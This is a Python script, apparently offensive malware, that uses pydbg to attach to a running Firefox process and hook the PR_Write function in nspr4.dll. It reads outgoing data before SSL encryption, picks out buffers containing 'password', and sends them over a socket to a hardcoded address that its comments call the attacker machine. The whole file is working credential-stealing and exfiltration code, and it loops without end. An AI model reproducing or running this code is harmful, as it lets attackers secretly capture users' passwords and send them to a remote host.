from pydbg import *
from pydbg.defines import *
import socket,subprocess
import struct
import utils
import sys
dbg           = pydbg()
found_firefox = False
HOST = '192.168.254.36'    # The remote host
PORT = 443            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send('[*] Connection Established!')
# Let's set a global pattern that we can make the hook 
# search for
pattern       = "password"

# We take in the dbg instance, which also contains all
# of our register contexts, and a list[] of arguments that
# we hooked, the one we are interested in is args[1]
def prints(text):
    s.send(text)
    
def ssl_sniff( dbg, args ):

    # Now we read out the memory pointed to by the second argument
    # it is stored as an ASCII string, so we'll loop on a read until
    # we reach a NULL byte
    buffer  = ""
    offset  = 0

    while 1:
        byte = dbg.read_process_memory( args[1] + offset, 1 )

        if byte != "\x00":
            buffer  += byte
            offset  += 1
            continue
        else:
            break

    if pattern in buffer:
        prints("Pre-Encrypted: %s" % buffer)

    return DBG_CONTINUE


def attack():
    # Quick and dirty process enumeration to find firefox.exe
    for (pid, name) in dbg.enumerate_processes():

        if name.lower() == "firefox.exe":

            found_firefox = True
            hooks         = utils.hook_container()

            dbg.attach(pid)
            prints("[*] Attaching to firefox.exe with PID: %d" % pid)

            # Resolve the function address
            hook_address  = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")

            if hook_address:
                # Add the hook to the container, we aren't interested
                # in using an exit callback so we set it to None
                hooks.add( dbg, hook_address, 2, ssl_sniff, None)
                prints("[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address)
                break
            else:
                prints("[*] Error: Couldn't resolve hook address.")
                sys.exit(-1)

    if found_firefox:    
        prints("[*] Hooks set, continuing process.")
        dbg.run()
    else:    
        prints("[*] Error: Couldn't find the firefox.exe process.")
        sys.exit(-1)

while True:
    attack()

